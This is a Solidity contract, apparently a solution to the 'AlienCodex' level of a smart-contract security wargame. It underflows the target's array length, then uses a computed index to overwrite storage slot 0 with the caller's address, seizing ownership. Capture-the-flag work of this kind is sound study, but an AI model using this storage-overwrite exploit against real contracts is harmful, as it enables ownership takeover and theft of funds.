// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

interface IAlienCodex {
    function make_contact() external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;
}

contract AlienCodexExploit {
    IAlienCodex level19;

    constructor(IAlienCodex _ac) public {
        level19 = _ac;
    }

    function exploit() external {
        level19.make_contact();
        level19.retract();
        uint256 index = ((2**256) - 1 - uint256(keccak256(abi.encode(1)))) + 1;
        level19.revise(index, bytes32(uint256(uint160(tx.origin))));
    }
}
